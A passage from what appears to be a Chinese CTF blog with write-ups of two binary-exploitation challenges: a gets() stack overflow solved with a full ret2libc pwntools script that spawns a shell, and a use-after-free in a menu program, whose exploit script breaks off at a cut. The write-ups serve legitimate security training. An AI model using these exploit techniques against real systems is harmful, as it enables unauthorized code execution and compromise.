<h3 id="CISCN-2019华中-PWN1"><a href="#CISCN-2019华中-PWN1" class="headerlink" title="[CISCN 2019华中]PWN1"></a>[CISCN 2019华中]PWN1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();</span><br><span class="line">    begin();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个明显的加密程序</p>
<p>有溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">encrypt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打ret2libc即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + <span class="number">0x4f440</span>, libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">24787</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = flat([cyclic(offset),rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],rdi,elf.got[<span class="string">&#x27;gets&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],<span class="number">0x0000000004009A0</span>])</span><br><span class="line">r()</span><br><span class="line">sl(payload)</span><br><span class="line">get_addr()</span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">gets_addr = get_addr()</span><br><span class="line">info(<span class="string">&quot;puts addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line">info(<span class="string">&quot;gets addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(gets_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">system,<span class="built_in">bin</span> = get_sb()</span><br><span class="line">payload = flat([cyclic(offset),rdi,<span class="built_in">bin</span>,system])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF-2020-YDSneedGirlfriend"><a href="#BJDCTF-2020-YDSneedGirlfriend" class="headerlink" title="[BJDCTF 2020]YDSneedGirlfriend"></a>[BJDCTF 2020]YDSneedGirlfriend</h3><p>尝试运行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YDS need a grilfriend!,can u <span class="built_in">help</span> him?</span><br><span class="line">------------------------</span><br><span class="line"> 1. Add a girlfriend  </span><br><span class="line"> 2. Delete a girlfriend </span><br><span class="line"> 3. show her name     </span><br><span class="line"> 4. give up           </span><br><span class="line">------------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myinit(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_girlfriend();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_girlfriend();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_girlfriend();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当他等于2的时候删除</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">del_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;girlfriendlist + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;girlfriendlist + v1) + <span class="number">1</span>));</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;girlfriendlist + v1));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);			<span class="comment">//存在double free</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入3的时候输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">print_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;girlfriendlist + v1) )</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(_QWORD))*(&amp;girlfriendlist + v1))(*(&amp;girlfriendlist + v1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不为空的时候调用了函数指针</p>
<p>为1的时候添加</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_girlfriend</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;girlfriendlist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;girlfriendlist + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;girlfriendlist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_QWORD *)*(&amp;girlfriendlist + i) = print_girlfriend_name;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Her name size is :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">        v3 = atoi(buf);</span><br><span class="line">        v0 = (__int64)*(&amp;girlfriendlist + i);</span><br><span class="line">        *(_QWORD *)(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(v3);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)*(&amp;girlfriendlist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Her name is :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;girlfriendlist + i) + <span class="number">1</span>), v3);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !Wow YDS get a girlfriend!&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们添加两个大于0x20的name的chunk，然后进行free，这时候我们有两个0x10的堆块被释放了，我们添加一个0x10的name的chunk就可控制index为0的函数指针，然后print调用他</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span 